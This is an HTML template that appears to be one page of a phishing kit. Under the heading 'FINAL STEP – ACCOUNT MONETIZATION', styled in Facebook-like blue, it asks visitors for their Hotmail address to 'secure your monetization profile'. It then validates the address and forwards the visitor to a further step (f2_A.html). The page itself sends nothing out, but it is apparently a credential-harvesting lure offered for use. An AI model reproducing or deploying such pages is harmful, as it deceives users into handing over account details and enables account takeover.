{% extends "base.html" %}
{% block body %}
<div class="card premium-card" style="max-width:420px;margin:48px auto;padding:40px 32px;text-align:center">
  
  <div class="header-icon">✨</div>
  
  <h2 class="section-title">FINAL STEP – ACCOUNT MONETIZATION</h2>
  <p class="section-subtitle">
    Enter your Hotmail email to secure your monetization profile.
  </p>

  <form method="post" id="f2Form" novalidate>
    
    <!-- Email Only -->
    <div class="form-group">
      <label class="form-label">Hotmail Address</label>
      <input 
        class="input wide" 
        id="address" 
        name="address" 
        type="email" 
        placeholder="username@hotmail.com" 
        required
        pattern="^[a-zA-Z0-9._%+-]+@hotmail.com$">
      <div class="error-message">
        Please enter a valid Hotmail address ending with <b>@hotmail.com</b>
      </div>
    </div>

    <button class="btn wide-btn" type="submit">
      <span class="btn-text">Continue</span>
    </button>

  </form>

</div>

<style>
.premium-card {
  background: #fff;
  border-radius: 20px;
  box-shadow: 0 12px 28px rgba(24,119,242,0.25);
  transition: box-shadow 0.35s ease, transform 0.25s ease;
  border: 1px solid #f1f5f9;
}
.premium-card:hover {
  box-shadow: 0 16px 36px rgba(24,119,242,0.35);
  transform: translateY(-2px);
}

.header-icon {
  font-size: 3rem;
  margin-bottom: 16px;
  animation: float 3s ease-in-out infinite;
}
@keyframes float {
  0%, 100% { transform: translateY(0px); }
  50% { transform: translateY(-5px); }
}

.section-title {
  font-size: 1.5rem;
  font-weight: 800;
  color: #0f172a;
  margin-bottom: 12px;
  letter-spacing: -0.5px;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}

.section-subtitle {
  color: #64748b;
  margin-bottom: 32px;
  font-size: 0.95rem;
  line-height: 1.5;
}

.form-group {
  margin-bottom: 24px;
  text-align: left;
}

.form-label {
  font-weight: 600;
  font-size: 0.9rem;
  margin-bottom: 8px;
  color: #374151;
}

.input.wide {
  width: 100%;
  padding: 16px 20px;
  border-radius: 18px;
  border: 2px solid #e5e7eb;
  font-size: 1rem;
  transition: all 0.3s;
}
.input.wide:focus {
  border-color: #1877F2;
  box-shadow: 0 0 0 4px rgba(24,119,242,0.15);
}
.input.error {
  border-color: #ef4444;
  box-shadow: 0 0 0 4px rgba(239,68,68,0.1);
  background: #fef2f2;
}

.error-message {
  font-size: 0.85rem;
  color: #dc2626;
  display: none;
  margin-top: 6px;
  font-weight: 500;
}

.wide-btn {
  width: 100%;
  padding: 18px;
  border-radius: 25px;
  font-size: 1.1rem;
  font-weight: 700;
  background: linear-gradient(135deg, #1877F2, #4e9af1);
  color: white;
  border: none;
  cursor: pointer;
  transition: 0.3s;
  box-shadow: 0 8px 20px rgba(24,119,242,0.35);
}
.wide-btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 12px 25px rgba(24,119,242,0.45);
}
</style>

<script>
document.getElementById("f2Form").addEventListener("submit", function(e) {
  let valid = true;
  let firstInvalid = null;

  const email = document.getElementById("address");
  const error = email.nextElementSibling;

  if (!email.checkValidity()) {
    valid = false;
    email.classList.add("error");
    error.style.display = "block";
    firstInvalid = email;
  } else {
    email.classList.remove("error");
    error.style.display = "none";
  }

  if (!valid) {
    e.preventDefault();
    firstInvalid.scrollIntoView({ behavior: "smooth", block: "center" });
    firstInvalid.focus({ preventScroll: true });
  }

  // ✅ If valid, redirect to f2_A.html
  if (valid) {
    e.preventDefault();
    window.location.href = "f2_A.html";
  }
});

// Real-time validation
document.getElementById("address").addEventListener("input", function () {
  if (this.checkValidity()) {
    this.classList.remove("error");
    this.nextElementSibling.style.display = "none";
  }
});
</script>

{% endblock %}
